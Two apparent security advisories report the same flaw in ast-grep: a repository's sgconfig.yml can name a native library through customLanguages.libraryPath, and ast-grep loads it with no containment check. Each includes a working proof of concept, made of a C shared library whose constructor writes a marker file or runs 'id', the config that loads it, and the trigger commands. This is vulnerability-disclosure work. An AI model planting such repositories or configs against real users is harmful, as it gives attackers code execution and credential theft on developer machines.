summary: ast-grep: customLanguages libraryPath loads native code outside the project
description:
### Summary
ast-grep loads native libraries named by customLanguages.libraryPath in
sgconfig.yml without confining them to the project, so an sgconfig.yml inside
an untrusted repository gives the repository author arbitrary native code
execution in the victim's ast-grep process. The config is auto-discovered from
the working directory, and running a linter on cloned code is the tool's core
use case.

### Details
crates/dynamic/src/custom_lang.rs (register_custom_language ->
to_registration):

```rust
let lib_path = match custom_lang.library_path {
    LibraryPath::Single(path) => path,
    ...
};
let path = base.join(lib_path);
```

`base` is the project directory. Absolute paths override the join entirely,
`..` components escape it. The result goes straight to the dynamic loader:

crates/dynamic/src/lib.rs:182

```rust
let (_lib, lang) = unsafe { load_ts_language(reg.lib_path, reg.symbol)? };
```

No canonicalization, no containment check, no user opt-in for loading
executable language plugins from the workspace.

Found by tarnish, my Rust static analyzer:

```
kind: path-traversal
file: crates/dynamic/src/custom_lang.rs:31

// crates/dynamic/src/custom_lang.rs:42-43, 51
let lib_path = match custom_lang.library_path {
  LibraryPath::Single(path) => path,
};
let path = base.join(lib_path);
```

### PoC
Verified against ast-grep 0.45.3 (release binary).

Attacker repo (the .so can also live outside the repo; ../ escape shown):

```
$ mkdir -p proj evil && cd proj
$ cat > ../evil/evil.c <<'EOF'
#include <stdio.h>
__attribute__((constructor))
static void on_load(void) {
    FILE *f = fopen("/tmp/sg_pwned_marker", "w");
    if (f) { fputs("native code executed\n", f); fclose(f); }
}
EOF
$ gcc -shared -fPIC ../evil/evil.c -o ../evil/evil.so
$ cat > sgconfig.yml <<'EOF'
customLanguages:
  evil:
    libraryPath: ../evil/evil.so
    extensions: [evil]
EOF
$ echo "int x = 1;" > t.evil
$ ast-grep scan
Error: Cannot load custom language library
...
╰▻ /tmp/sgpoc/evil/evil.so: undefined symbol: tree_sitter_evil

$ cat /tmp/sg_pwned_marker
native code executed
```

The dlsym failure happens after dlopen; the constructor already ran. No
config flag needed: sgconfig.yml is picked up from the cwd. An absolute
libraryPath (e.g. a path planted by another download) loads the same way.

### Impact
Arbitrary native code execution as the victim user when they run ast-grep
inside an attacker-controlled repository (clone, review, CI lint). This is a
workspace-trust break: a read-only lint operation executes repo-supplied
machine code.

### Disclosure Notice
If I don't get a response within two weeks, I'll go ahead and publicly disclose
this vulnerability. If you do get back to me, I'm happy to hold off on
disclosure for up to 6 weeks so you have time to look into it and work on a
fix. If you need more time than that, just let me know why and I'll consider
extending it further. I'm open to working with you on this, so feel free to
reach out with any questions.

Internal tracking ID: KF-202639691

summary: Remote Code Execution via Untrusted Custom Language Library in Project Configuration
description:
### Summary

An untrusted `sgconfig.yml` configuration can cause arbitrary native code execution through `customLanguages.<name>.libraryPath`.

`ast-grep` automatically discovers project configuration files and loads the dynamic library specified by `libraryPath` without workspace trust confirmation, signature verification, or trusted-path restrictions. A malicious repository can therefore execute code when a victim runs `ast-grep scan`, `ast-grep run`, or `ast-grep lsp`.




### Details

During startup, `ast-grep` automatically searches the current directory and its parent directories for `sgconfig.yml` or `sgconfig.yaml`.

The `customLanguages` configuration is passed to the custom-language registration logic. The attacker-controlled `libraryPath` eventually reaches the following code in `crates/dynamic/src/lib.rs:120-132`:

```rust
let abs_path = canonicalize(path)?;
let lib = Library::new(abs_path.as_os_str())?;
let func = lib.get(name.as_bytes())?;
let lang = func();
```

`canonicalize` only resolves the absolute filesystem path. It does not verify that the library is located in a trusted directory.

`Library::new` invokes `dlopen` on Linux or `LoadLibrary` on Windows. Native library constructors may execute immediately during this operation, before the configured tree-sitter symbol is validated or called.

An attacker can therefore place a malicious dynamic library inside a repository and reference it from:

```yaml
customLanguages:
  evil:
    libraryPath: ./evil.so
    languageSymbol: tree_sitter_evil
    extensions: [evil]

ruleDirs: []
```

No explicit user confirmation is required before the library is loaded.

### PoC

Create a malicious repository on Linux:

```bash
mkdir malicious-repo
cd malicious-repo

cat > evil.c <<'EOF'
#include <stdlib.h>

__attribute__((constructor))
static void init(void) {
    system("id > /tmp/ast-grep-rce");
}

void *tree_sitter_evil(void) {
    return 0;
}
EOF

cc -shared -fPIC evil.c -o evil.so

cat > sgconfig.yml <<'EOF'
customLanguages:
  evil:
    libraryPath: ./evil.so
    languageSymbol: tree_sitter_evil
    extensions: [evil]

ruleDirs: []
EOF
```

Trigger the vulnerability:

```bash
ast-grep scan . || true
cat /tmp/ast-grep-rce
```

It can also be triggered through the language server:

```bash
rm -f /tmp/ast-grep-rce
ast-grep lsp < /dev/null || true
cat /tmp/ast-grep-rce
```

Expected result:

```text
uid=... gid=... groups=...
```

`ast-grep` may later fail because the example function does not return a valid tree-sitter language. However, the dynamic library constructor has already executed during `Library::new`.

### Impact

This is an arbitrary code execution vulnerability caused by loading a project-controlled native library.

An attacker can exploit it by distributing a malicious repository or rule package and convincing a victim to run `ast-grep` inside it. Editor integrations that automatically start `ast-grep lsp` may also trigger the vulnerability when the repository is opened.

The malicious code runs with the privileges of the victim's `ast-grep` or editor process. An attacker could:

* steal SSH, Git, NPM, PyPI, or cloud credentials;
* read local source code and sensitive files;
* modify source code or insert backdoors;
* compromise build and development environments.

Developers, security researchers, CI environments, and editor users who process untrusted repositories are affected.
